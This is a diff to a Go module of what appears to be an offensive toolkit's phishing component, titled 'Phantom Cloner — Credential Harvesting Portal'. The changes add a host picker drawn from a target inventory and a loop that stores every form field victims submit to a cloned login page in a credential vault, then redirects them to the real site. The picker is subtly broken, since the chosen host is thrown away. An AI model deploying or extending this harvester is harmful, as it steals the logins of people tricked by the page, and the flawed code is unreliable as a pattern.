@@ -12,6 +12,8 @@ import (
 
 	"github.com/bryanparreira/davoid/internal/engagement"
 	"github.com/bryanparreira/davoid/internal/modules/ui"
+	"github.com/bryanparreira/davoid/internal/targets"
+	"github.com/bryanparreira/davoid/internal/vault"
 )
 
 var (
@@ -21,6 +23,20 @@ var (
 
 func Run() error {
 	ui.Header("Phantom Cloner — Credential Harvesting Portal")
+
+	// Offer known targets from inventory
+	eng2, _ := engagement.Active()
+	if eng2 != nil {
+		ips := targets.IPs(eng2.ID)
+		if len(ips) > 0 {
+			ui.Info(fmt.Sprintf("%d host(s) in inventory. Select or enter manually.", len(ips)))
+			opts := append([]string{"Enter manually"}, ips...)
+			idx := ui.Select("Target host", opts)
+			if idx > 0 {
+				_ = "http://" + ips[idx-1]
+			}
+		}
+	}
 
 	target := ui.Prompt("URL to clone (e.g. https://example.com/login)")
 	if target == "" {
@@ -76,6 +92,10 @@ func Run() error {
 				engagement.LogFinding(eng.ID, "phishing", r.RemoteAddr,
 					"Credential harvested via phishing page",
 					entry, "CRITICAL", entry)
+				// Parse and save each field pair to vault
+				for k, v := range r.Form {
+					vault.Save(eng.ID, "phishing", r.RemoteAddr, k, strings.Join(v, ","), "password")
+				}
 			}
 			// Redirect victim to real site
 			http.Redirect(w, r, target, http.StatusFound)
